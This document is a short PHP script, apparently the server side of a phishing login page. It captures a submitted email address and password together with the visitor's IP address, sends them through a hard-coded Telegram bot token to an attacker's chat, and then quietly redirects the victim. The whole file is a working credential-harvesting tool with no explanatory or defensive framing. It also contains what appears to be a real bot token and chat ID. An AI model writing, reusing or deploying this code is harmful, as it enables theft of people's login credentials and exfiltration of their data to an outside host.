<?php 
$email = $_POST['email'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

$token = "5752707593:AAFo45_blIO57VOLP7yEPQzxyewk4o0wYII";
$chat_id = "-1001775944955";

$arr = array(
  '🍆 Email: ' => $email,
  '💣 Pass:' => $pass,
  '👁️‍🗨️ IP:' => $ip
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: ./');
} else {
  echo "Error.. Please try again";
}
?>